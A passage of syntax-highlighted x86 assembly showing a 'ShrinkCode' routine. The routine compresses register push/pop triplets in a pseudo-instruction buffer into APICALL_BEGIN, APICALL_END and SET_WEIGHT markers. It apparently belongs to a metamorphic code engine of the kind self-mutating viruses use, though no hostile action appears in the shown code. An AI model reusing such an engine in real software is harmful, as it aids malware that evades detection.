                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">          </span><span class="sc1">; SET_WEIGHT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@AllOK</span><span class="sc0">
        </span><span class="sc5">@@ItsNot_SET_WEIGHT_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">@@ItsNot_SET_WEIGHT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@AllOK</span><span class="sc4">:</span><span class="sc0">


    </span><span class="sc5">@@CheckAPICALL_X</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Save pointer in EDX</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc5">@@GetSecondInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP2</span><span class="sc0"> </span><span class="sc1">; Get next</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; End of code?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfScan</span><span class="sc0">    </span><span class="sc1">; Finish, then</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Label over the instruction?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0"> </span><span class="sc1">; If there's label, ignore the group</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Put pointer in ESI</span><span class="sc0">

    </span><span class="sc5">@@GetThirdInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP2</span><span class="sc0"> </span><span class="sc1">; Do the same: increase pointer and check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; for end of code or a label over the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfScan</span><span class="sc0">    </span><span class="sc1">; instruction</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the first instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">     </span><span class="sc1">; PUSH Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@FindAPICALL_END</span><span class="sc0"> </span><span class="sc1">; If not, check next instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the second instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">     </span><span class="sc1">; PUSH Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@FindAPICALL_END</span><span class="sc0"> </span><span class="sc1">; If not, next instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the third instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">     </span><span class="sc1">; PUSH Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@FindAPICALL_END</span><span class="sc0"> </span><span class="sc1">; If not, next instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; First instruction is PUSH EAX?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@FindAPICALL_END</span><span class="sc0"> </span><span class="sc1">; If it isn't, it's not APICALL_*</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Is it PUSH ECX?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@FindAPICALL_END</span><span class="sc0"> </span><span class="sc1">; If not, check other</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Is it PUSH EDX</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@FindAPICALL_END</span><span class="sc0"> </span><span class="sc1">; If not, check other</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F4h</span><span class="sc0">    </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
      </span><span class="sc5">@@SetAPICALL_X</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; NOP the second and third instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0"> </span><span class="sc1">; Check next group</span><span class="sc0">

      </span><span class="sc5">@@FindAPICALL_END</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the first instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; POP Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0"> </span><span class="sc1">; If not, next group</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check the second instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; POP Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0"> </span><span class="sc1">; If not, next group</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the third instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; POP Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0"> </span><span class="sc1">; If not, next group</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; First instruction = POP EDX?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0"> </span><span class="sc1">; If not, check next group</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Second instruction = POP ECX?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0"> </span><span class="sc1">; If not, check next group</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Third instruction = POP EAX?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfTriplet</span><span class="sc0"> </span><span class="sc1">; If not, check next group</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc0">    </span><span class="sc1">; Set APICALL_END</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetAPICALL_X</span><span class="sc0">

      </span><span class="sc5">@@EndOfTriplet</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; Restore pointer and check next triplet</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@FindAPICALL_X</span><span class="sc0">

      </span><span class="sc5">@@EndOfScan</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ShrinkCode</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function used while we scan for APICALL_BEGIN and APICALL_END</span><span class="sc0">
</span><span class="sc5">IncreaseEIP2</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfScan</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; Increase instruction pointer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfScan</span><span class="sc0">     </span><span class="sc1">; If we finished the code, return -1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; If it's NOP, increase again</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IncreaseEIP2</span><span class="sc0">
